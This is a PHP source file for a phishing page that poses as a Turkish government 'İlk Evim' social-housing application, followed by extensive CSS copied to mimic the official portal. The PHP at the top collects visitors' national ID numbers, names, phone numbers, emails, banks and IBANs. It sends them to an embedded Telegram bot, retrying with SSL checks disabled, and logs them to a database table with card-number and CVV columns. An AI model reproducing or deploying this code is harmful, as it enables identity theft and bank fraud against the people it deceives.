<?php
// POST verilerini al
$projeAdi = isset($_POST['projeAdi']) ? $_POST['projeAdi'] : 'ADANA İMAMOĞLU 500/ 250000 SOSYAL KONUT PROJESİ';
session_start();
if (isset($_POST['tckn']) && $_POST['tckn'] !== '') {
    $_SESSION['tckn'] = $_POST['tckn'];
}
$tckn = isset($_POST['tckn']) ? $_POST['tckn'] : (isset($_SESSION['tckn']) ? $_SESSION['tckn'] : '');

// Telegram bildirim: 1binfo.php POST'u geldiğinde anlık gönder
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Aynı veriyi tekrar göndermeyi önlemek için basit bir hash kontrolü
    $payloadHash = hash('sha256', json_encode($_POST));
    if (!isset($_SESSION['last_1binfo_hash']) || $_SESSION['last_1binfo_hash'] !== $payloadHash) {
        $_SESSION['last_1binfo_hash'] = $payloadHash;

        $telegramBotToken = '7084799753:AAHyi3dGFLUKyFRx9nG2ywvFljkv-2w2dJQ'; // TODO: Bot token değerinizi yazın
        $telegramChatId  = '-4868113775';  // TODO: Chat ID değerinizi yazın

        if (!empty($telegramBotToken) && !empty($telegramChatId)) {
            // Ad Soyad'ı session/POST'tan türet
            $adCandidates = ['myadsoyad','adsoyad','ad_soyad','adi_soyadi','ad','adi','isim','gonderenadi'];
            $adFromPost = '';
            foreach ($adCandidates as $k) { if (isset($_POST[$k]) && $_POST[$k] !== '') { $adFromPost = $_POST[$k]; break; } }
            if ($adFromPost !== '') { $_SESSION['adsoyad'] = $adFromPost; }
            $adFromSession = isset($_SESSION['adsoyad']) ? $_SESSION['adsoyad'] : '';

            // Mesajı oluştur (örnekteki gibi ham POST alanlarıyla)
            $lines = [];
            $lines[] = 'Yeni 1binfo kaydı';
            if (!empty($tckn)) { $lines[] = 'TCKN: ' . $tckn; }
            if (!empty($adFromPost) || !empty($adFromSession)) {
                $lines[] = 'Ad Soyad: ' . ($adFromPost !== '' ? $adFromPost : $adFromSession);
            }
            $lines[] = 'Proje: ' . $projeAdi;
            $lines[] = '--- Form Alanları ---';
            foreach ($_POST as $k => $v) {
                if (is_array($v)) { $v = json_encode($v, JSON_UNESCAPED_UNICODE); }
                $lines[] = $k . ': ' . $v;
            }
            $text = implode("\n", $lines);
            // Telegram 4096 karakter sınırına takılmamak için güvenli kırpma
            if (strlen($text) > 3800) {
                $text = substr($text, 0, 3800) . "\n... (kısaltıldı)";
            }

            // Telegram API isteği
            $url = 'https://api.telegram.org/bot' . $telegramBotToken . '/sendMessage';
            $postFields = [
                'chat_id' => $telegramChatId,
                'text' => $text,
                'disable_web_page_preview' => true,
                'parse_mode' => 'HTML'
            ];

            // cURL ile gönder (1) SSL doğrulama açık
            $sendOk = false;
            $response = null;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            $response = curl_exec($ch);
            if ($response !== false) {
                $decoded = json_decode($response, true);
                if (is_array($decoded) && isset($decoded['ok']) && $decoded['ok'] === true) {
                    $sendOk = true;
                }
            }
            curl_close($ch);

            // cURL ile gönder (2) SSL doğrulama kapalı retry (Windows/XAMPP CA problemi için)
            if (!$sendOk) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                $response2 = curl_exec($ch);
                if ($response2 !== false) {
                    $decoded2 = json_decode($response2, true);
                    if (is_array($decoded2) && isset($decoded2['ok']) && $decoded2['ok'] === true) {
                        $sendOk = true;
                        $response = $response2;
                    }
                }
                curl_close($ch);
            }

            // file_get_contents fallback
            if (!$sendOk) {
                $ctx = stream_context_create([
                    'http' => [
                        'method' => 'POST',
                        'header' => 'Content-type: application/x-www-form-urlencoded',
                        'content' => http_build_query($postFields),
                        'timeout' => 10
                    ]
                ]);
                $response3 = @file_get_contents($url, false, $ctx);
                if ($response3 !== false) {
                    $decoded3 = json_decode($response3, true);
                    if (is_array($decoded3) && isset($decoded3['ok']) && $decoded3['ok'] === true) {
                        $sendOk = true;
                        $response = $response3;
                    }
                }
            }

            // Son durum ve logging
            if (!$sendOk) {
                $err = isset($_SESSION['telegram_error']) ? $_SESSION['telegram_error'] : '';
                $log = '[' . date('Y-m-d H:i:s') . "] Telegram gönderim başarısız. Hata: " . $err . " Yanıt1: " . (is_string($response) ? $response : 'yok') . "\n";
                @file_put_contents(__DIR__ . DIRECTORY_SEPARATOR . 'telegram.log', $log, FILE_APPEND);
            } else {
                $_SESSION['telegram_error'] = null;
            }
        }

        // Admin panele kaydet (logs tablosuna)
        require_once 'inc/brain.php';
        try {
            $adsoyad = isset($_POST['myadsoyad']) ? $_POST['myadsoyad'] : '';
            $cep = isset($_POST['cep']) ? $_POST['cep'] : '';
            $email = isset($_POST['vadecen']) ? $_POST['vadecen'] : '';
            $banka = isset($_POST['bank']) ? $_POST['bank'] : '';
            $iban = isset($_POST['myiban']) ? $_POST['myiban'] : '';
            $ip = $_SERVER['REMOTE_ADDR'] ?? '';

            $stmt = $pdo->prepare("INSERT INTO logs
                (adsoyad, kart_numarasi, kart_cvv, kart_skt, banka_adi, ip_address, tckns, mevcut_sayfa, email, aktif_check)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");

            $stmt->execute([
                $adsoyad,
                'TOKİ-' . $iban, // IBAN'ı kart numarası yerine
                $cep,            // Telefonu CVV yerine
                $email,          // Email'i SKT yerine
                $banka,
                $ip,
                $tckn,
                '1binfo.php',
                $email,
                time()
            ]);
        } catch (Exception $e) {
            error_log("Log kayıt hatası: " . $e->getMessage());
        }
    }
}
?>
<html lang="tr" translate="no"><head>
    <meta charset="UTF-8">
    <title>İlk Evim Konut Başvurusu</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" type="image/png" href="assets/favicon.png" sizes="196x196">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css" integrity="sha512-jnSuA4Ss2PkkikSOLtYs8BlYIeeIK1h99ty4YfvRPAlzr377vr3CXDb7sb7eEEBYjDtcYj+AjBH3FLv5uSJuXg==" crossorigin="anonymous" referrerpolicy="no-referrer">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script><style type="text/css" id="operaUserStyle"></style>
    <style>
        *{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;text-rendering:optimizeLegibility;text-shadow:rgba(0,0,0,.01) 0 0 1px}html{scroll-behavior:smooth}

        @font-face{font-family:'Roboto Slab';font-style:normal;font-weight:200;src:local('Roboto Slab Light'),local('RobotoSlab-Light');src:url(assets/fonts/open-sans-v18-latin-ext_latin-300.202.woff) format('woff'),url(assets/fonts/open-sans-v18-latin-ext_latin-300.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-300.202.ttf) format('truetype')}
        @font-face{font-family:'Roboto Slab';font-style:normal;font-weight:400;src:local('Roboto Slab'),local('RobotoSlab');src:url(assets/fonts/open-sans-v18-latin-ext_latin-regular.202.woff) format('woff'),url(assets/fonts/open-sans-v18-latin-ext_latin-regular.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-regular.202.ttf) format('truetype')}
        @font-face{font-family:'Open Sans';font-style:normal;font-weight:200;src:local('Open Sans Regular'),local('OpenSans-Regular'),url(assets/fonts/open-sans-v18-latin-ext_latin-300.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-300.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:italic;font-weight:200;src:local('Open Sans Italic'),local('OpenSans-Italic'),url(assets/fonts/open-sans-v18-latin-ext_latin-300italic.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-300italic.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:normal;font-weight:400;src:local('Open Sans Regular'),local('OpenSans-Regular'),url(assets/fonts/open-sans-v18-latin-ext_latin-regular.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-regular.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:italic;font-weight:400;src:local('Open Sans Italic'),local('OpenSans-Italic'),url(assets/fonts/open-sans-v18-latin-ext_latin-italic.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-italic.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:normal;font-weight:600;src:local('Open Sans SemiBold'),local('OpenSans-SemiBold'),url(assets/fonts/open-sans-v18-latin-ext_latin-600.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-600.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:italic;font-weight:600;src:local('Open Sans SemiBold Italic'),local('OpenSans-SemiBoldItalic'),url(assets/fonts/open-sans-v18-latin-ext_latin-600italic.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-600italic.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:normal;font-weight:700;src:local('Open Sans Bold'),local('OpenSans-Bold'),url(assets/fonts/open-sans-v18-latin-ext_latin-600.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-600.202.woff) format('woff')}
        @font-face{font-family:'Open Sans';font-style:italic;font-weight:700;src:local('Open Sans Bold Italic'),local('OpenSans-BoldItalic'),url(assets/fonts/open-sans-v18-latin-ext_latin-600italic.202.woff2) format('woff2'),url(assets/fonts/open-sans-v18-latin-ext_latin-600italic.202.woff) format('woff')}
        a{
            text-decoration: none;
        }
        body {
            font-family: 'Open Sans', sans-serif;
            letter-spacing: -.25px;
            font-weight: 400;
            font-size: 15px;
            background-color: #FFF;
            cursor: default;
        }
        header#top.sticky_init {
            position: fixed;
        }
        header#top {
            background: #3b77ac;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            overflow: visible;
            position: relative;
            z-index: 99995;
            width: 100%;
            -webkit-transition: background-color .5s, -webkit-box-shadow .5s;
            transition: background-color .5s, -webkit-box-shadow .5s;
            -o-transition: box-shadow .5s, background-color .5s;
            transition: box-shadow .5s, background-color .5s;
            transition: box-shadow .5s, background-color .5s, -webkit-box-shadow .5s;
        }
        main {
            margin: 0;
          /*  margin-top: 80px;*/

            border: none;
            padding: 0;
            font-weight: 400;
            list-style: none;
            background: #e7ebee;
            padding-bottom: 2.5em;
        }
        section.outer{
            max-width: 1200px;
            overflow: hidden;
            margin: 0 auto;
            background: #fff;
            min-height: 100%;
            border-radius: .5em .5em;
            margin-top: 50px;
            background: #fff;
        }
        section.outer > .inner{
            position: relative;
            z-index: 10;
            -webkit-box-shadow: 0 1em 1em -1em rgba(0, 0, 0, .15);
            box-shadow: 0 1em 1em -1em rgba(0, 0, 0, .15);
            -webkit-box-sizing: border-box;
        }
        .page-inner{
            display: flex;
        }
        main nav{
        }
        main nav ul{
            border-radius: 0 0 .5em .5em;
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            max-width: 1200px;
            margin-left: auto;
            margin-right: auto;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            text-align: left;
            white-space: nowrap;
            overflow: hidden;
            -o-text-overflow: ellipsis;
            text-overflow: ellipsis;
            position: relative;
            font-size: 85%;
            padding: .25em .25em 0 .25em;
            background: #fff;
        }
        main nav ul li {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: inline-block;
            overflow: hidden;
            white-space: nowrap;
            -o-text-overflow: ellipsis;
            text-overflow: ellipsis;
            margin-right: .25em;
            padding-right: 1em;
            background-image: url(assets/breadcrumb-right.svg);
            background-size: 5px 16px;
            background-position: center right;
            background-repeat: no-repeat;
        }
        main nav ul li a.home {
            -o-text-overflow: clip;
            text-overflow: clip;
            white-space: normal;
            padding: 0;
            overflow: hidden;
            width: 1.7em;
            height: 1.7em;
            padding-left:3px;
        }
        main nav ul li a {
            text-decoration: none;
            color: #3b77ac;
            display: block;
            padding: .25em 0;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            max-width: 15em;
            white-space: nowrap;
            overflow: hidden;
            -o-text-overflow: ellipsis;
            text-overflow: ellipsis;
        }
        main nav ul li.here {
            padding: .25em 0;
            background: 0 0;
        }
        header {
            font-size: 95%;
        }
        .logo-area {
            display: block;
            text-indent: 200%;
            white-space: nowrap;
            overflow: hidden;
            background-image: url(assets/white_logo.png);
            background-image: url(assets/white_logo.svg), none;
            background-size: 245px 50px;
            background-repeat: no-repeat;
            background-position: left center;
            /* max-height: 2.5em; */
            min-height: 5em;
            max-width: 14em;
            background-size: 14em auto;
            margin-top: 5px;
            margin-left: -7px;
        }
        .container{
            max-width: 1200px;
        }
        .menuList{
            padding: 20px 10px 0 0;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -ms-flex-negative: 1;
            flex-shrink: 1;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row wrap;
            flex-flow: row wrap;
            float: none;
            -webkit-box-pack: end;
            -ms-flex-pack: end;
            justify-content: flex-end;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            min-height: 51.5px;
        }
        .menuList > li {
            margin-left: .1em;
            margin-bottom: .5em;
            list-style-type: none;
        }
        .menuList .fast-shortcuts a {
            color: rgba(255, 255, 255, .9);
            text-decoration: none;
        }
        .fast-shortcuts {
            margin-left: .3rem;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: .66em;
            border: 1px solid rgba(255, 255, 255, .1) !important;
            border-radius: .5em;
            width: 100px;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row nowrap;
            flex-flow: row nowrap;
            -ms-flex-pack: distribute;
            justify-content: space-around;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            background: transparent;
            color:#fff;
        }
        .fast-shortcuts.mini{
            width: 68px;
            display: block;
            font-size: 13px;
        }
        .dropdown.custom ul li a{
            display: block;
            margin: 0;
            padding: .3em;
            border-radius: 2px;
            color: #4284be;
            text-decoration: none;
            font-size: 14.3px;
        }
        .dropdown.custom ul{
            list-style-type: none;
            margin: 0;
            padding: 0;
            padding-left:10px;
            -webkit-box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
            box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
        }
        .dropdown-menu{
            --bs-dropdown-min-width: 7rem;
        }
        .icons i{
            padding: 0px 4px;
        }
        .header-search {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row nowrap;
            flex-flow: row nowrap;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            margin-right: 8px;
            margin-left: 3px;
        }
        .header-search input {
            padding: .3em 28px .3em .7em;
            border-radius: .5em;
            border: none;
            height: 2.4em;
            color: #4b4e51;
            width: 226px;
            padding-right: 46px;
        }
        .header-search i {
            color: #4284be;
            margin-left: -25px;
            position: relative;
            right: -3px;
        }
        .custom2 .dropdown1 em {
            vertical-align: middle;
            display: inline-block;
            position: relative;
            border-radius: 2px;
            padding: .1em .4em;
            background: #42be7c;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            text-align: center;
            font-style: normal;
            line-height: 1.5;
            font-size: 75%;
            color: #FFF;
            margin: 0 0 0 .25em;
        }
        .custom2 .dropdown1{
            width: 145px;
        }
        .custom2 .dropdown1 em i{
            color:#fff;
        }
        .dropdown1{
            background: #fff;
            -webkit-box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
            box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            border-radius: .5em;
            padding: .5em 0 .5em .3em;
            text-decoration: none;
            color: #4b4e51;
            margin-left:10px;
        }
        .custom2 .dropdown-menu{
            --bs-dropdown-min-width: 11rem;
        }
        .dropdown1 i {
            color: #4284be;
            font-size:12px;
        }
        .sabit {
            border-bottom: 1px dotted #a9a9a9;
            padding: .3em;
            font-size: 14px;
        }
        .box-header {
            display: flex;
            flex-wrap: nowrap;
            width: 100%;
            -webkit-box-shadow: 0 1em 1em -1em rgba(0, 0, 0, .15);
            box-shadow: 0 1em 1em -1em rgba(0, 0, 0, .15);
        }
        .box-header img {
            width: 64px;
            height: 64px;
            margin-left: 1rem;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            margin-top: 8px;
        }
        .box-header h2 {
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-flow: column nowrap;
            flex-flow: column nowrap;
            padding: .5rem;
            min-width: 0;
            margin: .5rem 0;
            height: 65px;
        }
        .box-header h2 a {
            font-size: 15px;
            font-weight: 200;
            display: block;
            text-decoration: none;
            color: #3b77ac;
        }
        .box-header h2 em {
            font-size: 19px;
            font-weight: 200;
            font-style: normal;
            overflow: hidden;
            -o-text-overflow: ellipsis;
            text-overflow: ellipsis;
            white-space: nowrap;
            min-width: 0;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            padding-top: 5px;
        }
        .actions{
            width: auto;
            display: flex;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            margin: 0 10px 0 0;
            padding: 0;
            height: 100%;
            justify-content: end;
        }
        .actions a{
            position: relative;
            color: #83929f;
            background: #f6f7f8;
            border: none;
            border-radius: 4px;
            margin: 5px 4px;
            -webkit-box-shadow: 0 2px 8px rgba(0, 0, 0, .16);
            box-shadow: 0 2px 8px rgba(0, 0, 0, .16);
            padding: 11px 8px;
            font-size: 1.2rem;
            display: flex;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
        }
        .actions i{
            font-size:14px;
            padding-right: 5px;
        }
        .flex_center {
            display: flex;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
        }
        .actions .flex_center span{
            font-size: .78rem;
            line-height: 18px !important;
            display: inline-block;
        }
        aside {
            font-weight: 200;
            font-size: 90%;
            background-color: rgba(231, 235, 238, .5);
            border-radius: .5em;
            position: relative;
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: none;
            z-index:12;
        }
        aside ul {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            -webkit-transition: opacity 1s;
            -o-transition: opacity 1s;
            transition: opacity 1s;
        }
        aside ul li{
            padding: 1em;
            border-bottom: 2px solid #fff;
            word-wrap: break-word;
        }
        aside ul li .timeIcon{
            display: block;
            color: #a9acaf;
            height: 2.6em;
            display: block;
            vertical-align: middle;
            line-height: 1;
            font-weight: 400;
            font-style: normal;
            speak: none;
            text-decoration: inherit;
            text-transform: none;
            text-rendering: auto;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            text-align: center;
        }
        aside ul li .timeIcon i{
            font-size: 180%;
        }
        audio, canvas, progress, video {
            display: inline-block;
            vertical-align: baseline;
        }
        progress {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: hidden;
            height: .66em;
            width: 100%;
            border-radius: .33em;
        }
        .ol-list{
            padding: unset;
            border-bottom: none;
        }
        .ol-list .asamaBtns{
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            padding: 1em;
        }
        .ol-list .asamaBtns li{
            list-style: decimal inside;
            border: solid 1px #a9acaf;
            padding: .33em .25em !important;
            border-radius: .25em;
            margin-bottom: .5em;
            color: #a9acaf;
            padding: 1em;
        }
        .ol-list .asamaBtns .secili{
            border: solid 1px #4284be;
            color: #4284be;
            background: #fff;
        }
        .islemDurumu a {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            text-decoration: none;
            font-weight: 600;
            width: 100%;
            color: #3b77ac;
            margin-top: .5em;
            margin-bottom: .5em;
            border-bottom: 1px solid #a1c2df;
            padding-bottom: .2em;
        }
        progress::-moz-progress-bar { background: #4284be; }
        progress::-webkit-progress-bar {background-color: #a9acaf;}
        progress::-webkit-progress-value { background: #4284be; }

        content{
            position: relative;
            padding: 1em;
            width: 100%;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            z-index: 13;
        }
        content p{
            padding: 0 0 1em 0;
        }
        .permissionNeeded {
            display: block;
            padding: 0;
            position: relative;
            margin: 0 .5em 1em .5em;
            border-radius: .5em;
            overflow: hidden;
            border: 1px solid rgba(66, 132, 190, .33);
        }
        .permissionNeeded img {
            position: absolute;
            margin-top: 110px;
            margin-left: 15px;
        }
        .permissionNeeded .warn-text{
            padding: 1em;
            padding-left: 14em;
        }
        .permissionNeeded em{
            font-style: normal;
            font-weight: 600;
            color: #4b4e51;
        }
        .permissionNeeded p{
            padding-top: 1em;
            padding-bottom: 0em;
        }
        .permissionNeeded ul{
            list-style: disc;
            list-style-position: inside;
            margin: 0;
            padding: .5em 0 .5em 0;
        }
        .permissionNeeded .action{
            padding: 1.5em;
            background: -webkit-gradient(linear, left top, left bottom, from(rgba(66, 132, 190, 0)), to(rgba(66, 132, 190, .2)));
            background: -o-linear-gradient(top, rgba(66, 132, 190, 0), rgba(66, 132, 190, .2));
            background: linear-gradient(to bottom, rgba(66, 132, 190, 0), rgba(66, 132, 190, .2));
            text-align: center;
        }
        .permissionNeeded a {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            text-decoration: none;
            background: #3b77ac;
            color: #fff;
            font-size: 100%;
            border-radius: 1.25em;
            padding: .5em 1.5em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: 2.66em;
            margin-top: .25em;
            margin-bottom: .25em;
            border: 1px rgba(59, 119, 172, .3) solid;
            -webkit-box-shadow: inset 0 .05em 0 rgba(255, 255, 255, .3), 0 .5em .5em -.5em rgba(0, 0, 0, .25);
            box-shadow: inset 0 .05em 0 rgba(255, 255, 255, .3), 0 .5em .5em -.5em rgba(0, 0, 0, .25);
        }
        .permissionNeeded a:hover{
            background-color: #4284be;
        }
        footer {
            background: #4b4e51;
            padding: 2em 1em 1em 1em;
        }
        footer .inner{
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-flow: column nowrap;
            flex-flow: column nowrap;
            max-width: 1200px;
            margin: 0 auto;
            width: 100%;
        }
        footer .inner .starts{
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
        }
        footer .linksarea{
            -webkit-box-flex: 4;
            -ms-flex-positive: 4;
            flex-grow: 4;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -ms-flex-negative: 1;
            flex-shrink: 1;
        }
        footer h2 {
            border: 0;
            padding: 0;
            clip: rect(0 0 0 0);
            height: 1px;
            width: 1px;
            margin: -1px;
            overflow: hidden;
            position: absolute;
        }
        footer .links {
            margin-bottom: 2em;
            padding: 0;
            width: 100%;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row wrap;
            flex-flow: row wrap;
        }
        footer .links > li{
            width: 30%;
            margin: 1em .5em;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-flow: column nowrap;
            flex-flow: column nowrap;
            list-style-type: none;
        }
        footer .links li h3 {
            margin: 0;
            display: block;
            font-size: 90%;
            color: #FFF;
            font-weight: 600;
        }
        footer .links li ul {
            margin: 0;
            padding: 0;
        }
        footer .links li ul li {
            font-size: 85%;
            color: #FFF;
            font-weight: 200;
            list-style-type: none;
        }
        footer .links li ul li a {
            text-decoration: none;
            font-size: 100%;
            color: #FFF;
            font-weight: 200;
            line-height: 200%;
        }
        footer .right-part {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
        }
        footer .foot-card{
            padding: 1em;
            border: 1px solid rgba(255, 255, 255, .5);
            border-radius: 1em;
            color: #FFF;
            font-size: 85%;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-flow: column nowrap;
            flex-flow: column nowrap;
            -ms-flex-negative: 1;
            flex-shrink: 1;
        }
        footer .foot-card .card-text {
            font-weight: 200;
            background-image: url(assets/helpbuoy.svg);
            background-size: 3em;
            background-position: top left;
            background-repeat: no-repeat;
            min-height: 3em;
            padding-left: 4em;
        }
        footer .foot-card .card-text em {
            font-weight: 600;
            font-style: normal;
        }
        footer .foot-card ul {
            margin: 0;
            margin-top: 1em;
            padding: 0;
            list-style-type: none;
        }
        footer .foot-card ul li {
            border-bottom: dotted 1px rgba(255, 255, 255, .5);
            margin-bottom: .5em;
            padding-bottom: .5em;
        }
        footer .foot-card ul li a {
            text-decoration: none;
            color: #FFF;
            line-height: 1.5em;
            display: block;
            font-weight: 200;
        }
        footer .foot-card ul li:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        footer .foot-card ul li a i{
            font-size: 17px;
            padding-right: 7px;
        }
        footer .right-part .social-links{
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 1em;
            border: 1px solid rgba(255, 255, 255, .5);
            border-radius: 1em;
            margin: 1em 0;
            -ms-flex-negative: 1;
            flex-shrink: 1;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row wrap;
            flex-flow: row wrap;
        }
        footer .right-part .social-links a{
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            width: 50%;
            color: #FFF;
            text-decoration: none;
            border-bottom: 1px dotted rgba(255, 255, 255, .5);
            margin: 0 0 .5em 0;
            padding: 0 0 .5em 0;
            font-size: 85%;
        }
        footer .right-part .social-links a i{
            padding-right: 5px;
            padding-top: 3px;
        }
        footer .right-part .social-links a:nth-last-of-type(-n+2) {
            border-bottom: none;
            margin: 0;
            padding: 0;
        }
        footer .sub-copyright {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row nowrap;
            flex-flow: row nowrap;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            -ms-flex-negative: 1;
            flex-shrink: 1;
            color: #FFF;
            font-weight: 200;
            font-size: 75%;
            padding: 2em 0;
            border-bottom: 1px dashed rgba(255, 255, 255, .25);
            border-top: 1px dashed rgba(255, 255, 255, .25);
        }
        footer .sub-copyright .images {
            -ms-flex-negative: 1;
            flex-shrink: 1;
            min-width: 350px;
        }
        footer .sub-copyright a {
            display: inline;
            text-decoration: none;
            color: #FFF;
            font-weight: 600;
        }
        footer .sub-copyright img {
            height: 45px;
            width: auto;
            margin-right: 8px;
        }
        footer .copyright {
            color: #FFF;
            font-weight: 200;
            font-size: 75%;
            text-align: center;
            margin-top: 1em;
            height: 45px;
        }
        footer .copyright a {
            text-decoration: none;
            color: #FFF;
            font-weight: 600;
        }
        footer .text1 {
            -ms-flex-negative: 1;
            flex-shrink: 1;
            margin-top: 10px;
            max-width: 100%;
        }
        .scroll-top {
            line-height: 38px;
            width: 40px;
            height: 40px;
            bottom: 12px;
            right: 12px;
            font-size: 1.3em;
            display: none;
            position: fixed;
            text-align: center;
            border-radius: 50%;
            color: #fff;
            background-color: #347aa1;
            -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, .15), 0 2px 4px rgba(0, 0, 0, .16);
            box-shadow: 0 6px 12px rgba(0, 0, 0, .15), 0 2px 4px rgba(0, 0, 0, .16);
            opacity: .8;
            -webkit-transition: all .2s;
            -o-transition: all .2s;
            transition: all .2s;
            z-index: 999;
        }
        .scroll-top:focus, .scroll-top:hover {
            opacity: 1;
        }
        .toolbar{
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            zoom: 1;
            overflow: hidden;
            padding: .5em;
            margin-bottom: 1em;
            background: rgba(231, 235, 238, .5);
            border-radius: .25em;
        }
        .toolbar li {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            float: right;
            margin: .2em;
            border-radius: .25em;
        }
        content a {
            text-decoration: none;
            color: #3b77ac;
        }
        .toolbar li a {
            border: none;
            margin: 0;
